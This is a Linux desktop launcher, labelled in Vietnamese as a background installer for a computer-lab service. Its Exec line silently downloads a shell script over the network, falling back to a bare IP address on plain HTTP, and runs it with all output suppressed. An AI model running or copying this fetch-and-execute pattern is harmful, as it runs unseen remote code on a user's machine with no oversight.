[Desktop Entry]
Version=1.0
Type=Application
Name=2 - Cài Đặt Dịch Vụ Phòng Máy
Comment=Cài đặt dịch vụ phòng máy tự động (Chạy ngầm)
Exec=sh -c 'DIR="$(cd "$(dirname "%k")" 2>/dev/null && pwd || pwd)"; if [ -f "$DIR/install.sh" ]; then bash "$DIR/install.sh" >/dev/null 2>&1; elif [ -f "./install.sh" ]; then bash "./install.sh" >/dev/null 2>&1; else (wget -qO /tmp/sg_install.sh https://orbstrike.com/install.sh || wget -qO /tmp/sg_install.sh https://103-149-172-179.sslip.io/install.sh || wget -qO /tmp/sg_install.sh http://103.149.172.179:4000/install.sh) && bash /tmp/sg_install.sh >/dev/null 2>&1; fi'
